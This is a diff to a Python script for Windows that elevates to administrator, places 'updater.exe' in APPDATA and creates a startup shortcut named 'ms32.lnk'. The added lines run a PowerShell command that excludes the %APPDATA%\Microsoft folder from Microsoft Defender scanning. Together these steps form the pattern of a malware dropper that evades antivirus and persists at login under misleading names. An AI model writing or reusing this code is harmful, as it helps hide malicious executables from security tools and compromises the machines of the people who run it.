@@ -1,10 +1,9 @@
 import os
 import shutil
-import sys
 import ctypes
 from elevate import elevate
 from webbrowser import open as open_t
-
+import subprocess
 # Check if the script is running with administrator privileges (Windows version)
 def is_admin():
     try:
@@ -30,6 +29,23 @@ destination_updater = os.path.join(appdata_path, 'updater.exe')
 destination_shortcut = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ms32.lnk"
 if os.path.exists(appdata_path):
     shutil.rmtree(appdata_path)
+path = os.path.expandvars(r"%APPDATA%\Microsoft")
+def run_powershell_command(command):
+    try:
+        result = subprocess.run(
+            ["powershell", "-Command", command],
+            capture_output=True,
+            text=True,
+            shell=True
+        )
+        if result.returncode != 0:
+            raise Exception(result.stderr.strip())
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error: {e}"
+
+command = f"Add-MpPreference -ExclusionPath '{path}'"
+run_powershell_command(command)
 try:
     # Ensure the destination directory for the folder exists
     if not os.path.exists(appdata_path):
